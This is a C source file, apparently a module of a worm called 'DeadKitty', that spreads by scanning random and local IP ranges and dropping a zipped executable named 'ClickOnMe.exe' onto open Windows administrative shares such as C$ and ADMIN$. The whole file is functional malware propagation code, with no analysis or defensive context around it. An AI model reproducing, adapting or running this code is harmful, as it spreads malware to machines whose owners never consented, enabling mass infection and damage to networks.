   /* Spreading over shared directories */

   #include "DeadKitty.h"

   /* default shared resources */
   const char *SharedNames[] = {
       "C$",
       "ADMIN$",
       "SharedDocs",
       "IPC$"
   };

   #define SHARED_NUMS 4

   void DropWormInShare(char *remote)
   {
       int ShareCnt;
       NETRESOURCE net_inf;
       char nb_remote[MAX_PATH];
       char tmp_zip[MAX_PATH];
       DWORD ret;

       for(ShareCnt = 0;ShareCnt < SHARED_NUMS;ShareCnt++)
       {
           memset(nb_remote,0,MAX_PATH);
           sprintf(nb_remote,"%s\\%s",remote,SharedNames[ShareCnt]);
           memset(&net_inf,0,sizeof(net_inf));
           net_inf.dwDisplayType = RESOURCETYPE_ANY;
           net_inf.lpRemoteName = nb_remote;
           net_inf.lpLocalName = NULL;
           net_inf.lpProvider = NULL;

           ret = WNetAddConnection2(&net_inf,NULL,NULL,0);

           if(ret == NO_ERROR)
           {
               strcat(nb_remote,"\\D00mr1d3rz.zip");
               strcpy(tmp_zip,WinDir);
               strcat(tmp_zip,"\\ShareTmp.zip");

               if(MakeZip(tmp_zip,DeadKittyPath,"ClickOnMe.exe"))
               {
                   CopyFile(tmp_zip,nb_remote,FALSE);
                   DeleteFile(tmp_zip);
               }

               sprintf(nb_remote,"%s\\%s",remote,SharedNames[ShareCnt]);
               WNetCancelConnection(nb_remote,TRUE);
           }


       }

   }

   /* Totally random scan */
   DWORD WINAPI Th_RandScan(LPVOID Data)
   {
       char rnd[32];

       srand(GetTickCount() ^ GetCurrentProcessId()); /* initialize random number generator */

       for(;1;)
       {
           sprintf(rnd,"\\\\%d.%d.%d.%d",(rand()%255)+1,(rand()%256),
               (rand()%256),(rand()%256));

           DropWormInShare(rnd);
           WAIT(5); /* wait a bit */
       }
   }

   /* "local" scan */
   DWORD WINAPI Th_LocalScan(LPVOID Data)
   {
       char localhost[256],*currentIP,scanip[32];
       HOSTENT *resolve = NULL;
       int NetCnt = 0;
       DWORD oct1,oct2,oct3,oct4;

       if(gethostname(localhost,256) != 0)
       {
           ExitThread(0);
       }

       /* get all interfaces */
       if((resolve = gethostbyname(localhost)) == NULL)
       {
           ExitThread(0);
       }

       while(resolve->h_addr_list[NetCnt])
       {
           currentIP = inet_ntoa(*(struct in_addr *)resolve->h_addr_list[NetCnt]);

           /* here we scan */
           oct1 = atoi(strtok(currentIP,"."));
           oct2 = atoi(strtok(NULL,"."));
           oct3 = atoi(strtok(NULL,"."));
           oct4 = atoi(strtok(NULL,"."));

           for(;oct3 < 256;oct3++)
           {
               for(oct4 = oct4+1;oct4 < 256;oct4++)
               {
                   sprintf(scanip,"\\\\%d.%d.%d.%d",oct1,oct2,
                       oct3,oct4);
                   DropWormInShare(scanip);
               }
           }

           /* go to next interface */
           WAIT(5);
           NetCnt++;
       }


   }


   void NetShareSpread(void)
   {
       DWORD NetShareSpreadId,Cnt;

       /* choose what range to scan */
       if(MyRand())
       {
           for(Cnt = 0;Cnt < 5;Cnt++)
           {
               CreateThread(NULL,0,&Th_RandScan,0,0,&NetShareSpreadId);
           }
       }

       else
       {
           CreateThread(NULL,0,&Th_LocalScan,0,0,&NetShareSpreadId);
       }
   }
